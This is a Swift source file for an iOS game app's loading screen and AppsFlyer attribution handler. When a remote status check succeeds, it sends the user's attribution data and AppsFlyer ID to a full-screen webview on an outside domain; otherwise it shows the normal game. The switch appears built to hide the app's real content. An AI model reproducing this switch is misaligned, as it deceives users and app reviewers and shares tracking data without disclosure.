//
//  LoaderViewController.swift
//  RescueRooster
//
//  Created by Damon Earley on 02.09.2025.
//

import UIKit
import SwiftUI
import AppsFlyerLib

class LoadingSplash: UIViewController {

    let loadingLabel = UILabel()
    let loadingImage = UIImageView()

    private let activityIndicator: UIActivityIndicatorView = {
        let indicator = UIActivityIndicatorView(style: .large)
        indicator.color = .white
        indicator.translatesAutoresizingMaskIntoConstraints = false
        indicator.hidesWhenStopped = true
        return indicator
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupUI()
        setupFlow()
    }

    private func setupUI() {
        print("start setupUI")
        view.addSubview(loadingImage)
        loadingImage.image = UIImage(resource: .loadingLogo)

        view.addSubview(activityIndicator)
        
        loadingImage.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            loadingImage.topAnchor.constraint(equalTo: view.topAnchor),
            loadingImage.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loadingImage.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loadingImage.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
        ])
    }

    private func setupFlow() {
        activityIndicator.startAnimating()

        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            print("✅ Using existing AppsFlyer data")
            appsFlyerDataReady()
        } else {
            print("⌛ Waiting for AppsFlyer data...")

            NotificationCenter.default.addObserver(
                self,
                selector: #selector(appsFlyerDataReady),
                name: Notification.Name("AppsFlyerDataReceived"),
                object: nil
            )

            // Таймаут на случай, если данные так и не придут
            DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                if UserDefaults.standard.string(forKey: "finalAppsflyerURL") == nil {
                    print("⚠️ Timeout waiting for AppsFlyer. Proceeding with fallback.")
                    self.appsFlyerDataReady()
                }
            }
        }
    }

    @objc private func appsFlyerDataReady() {
        NotificationCenter.default.removeObserver(self, name: Notification.Name("AppsFlyerDataReceived"), object: nil)
        proceedWithFlow()
    }

    private func proceedWithFlow() {
        
        CheckURLService.checkURLStatus { is200 in
            DispatchQueue.main.async { [self] in
                if is200 {
                    print("is 200")
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                        appDelegate.restrictRotation = .all
                    }
                    let link = self.generateTrackingLink()
                    activityIndicator.stopAnimating()
                    let vc = WebviewVC(url: URL(string: link)!)
                    vc.modalPresentationStyle = .fullScreen
                    self.present(vc, animated: true)
                } else {
                    if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
                                       appDelegate.restrictRotation = .portrait
                                   }
                                   activityIndicator.stopAnimating()
                                   
                                   // Показываем LoadController, который перейдет к WelcomeController
                                   let vc = LoadController()
                                   let navigationController = UINavigationController(rootViewController: vc)
                                   navigationController.modalPresentationStyle = .fullScreen
                                   navigationController.navigationBar.isHidden = true
                                   self.present(navigationController, animated: true)
                }
            }
        }
    }
    
    func generateTrackingLink() -> String {
        let base = "https://eggskipper.space/qy8g8vDH"
        if let savedURL = UserDefaults.standard.string(forKey: "finalAppsflyerURL") {
            let full = base + savedURL
            print("✅ Generated tracking link: \(full)")
            return full
        } else {
            print("⚠️ AppsFlyer data not available, returning base URL only")
            return base
        }
    }
}




extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable: Any]) {
        guard let data = conversionInfo as? [String: Any] else {
            print("⚠️ Failed to convert conversionInfo to [String: Any]")
            return
        }
        
        print("📦 AppsFlyer raw data received: \(data)")
        
        // Получаем AppsFlyer ID
        let appsflyerID = AppsFlyerLib.shared().getAppsFlyerUID()
        
        // Создаём базовый словарь параметров
        var queryParams = [String: String]()
        
        // Добавляем AppsFlyer ID
        queryParams["appsflyer_id"] = appsflyerID
        
        // Обрабатываем все входящие параметры
        for (key, value) in data {
            // Преобразуем значение в строку
            let stringValue: String
            
            if let str = value as? String {
                stringValue = str
            } else if let num = value as? NSNumber {
                stringValue = num.stringValue
            } else if let boolVal = value as? Bool {
                stringValue = boolVal ? "true" : "false"
            } else {
                stringValue = "\(value)"
            }
            
            // Добавляем в параметры, исключая пустые значения
            if !stringValue.isEmpty {
                queryParams[key] = stringValue
            }
        }
        
        // Специальная обработка для кампании (как в оригинальном коде)
        if let afStatus = queryParams["af_status"]?.lowercased(), afStatus == "organic" {
            queryParams["campaign"] = "organic"
        } else if let campaign = queryParams["campaign"] {
            let parts = campaign.components(separatedBy: "_")
            if !parts.isEmpty {
                queryParams["campaign"] = parts[0]
                for (index, part) in parts.enumerated() where index > 0 && index <= 6 {
                    queryParams["sub\(index)"] = part
                }
            }
        }
        
        // Строим URL строку
        let queryItems = queryParams.map { URLQueryItem(name: $0.key, value: $0.value) }
        var urlComponents = URLComponents()
        urlComponents.queryItems = queryItems
        
        guard let finalURL = urlComponents.url?.absoluteString else {
            print("⚠️ Failed to construct final URL")
            return
        }
        
        print("✅ Final URL: \(finalURL)")
        UserDefaults.standard.set(finalURL, forKey: "finalAppsflyerURL")
        NotificationCenter.default.post(name: Notification.Name("AppsFlyerDataReceived"), object: nil)
    }

    func onConversionDataFail(_ error: Error) {
        print("❌ Conversion data error: \(error.localizedDescription)")
    }
}
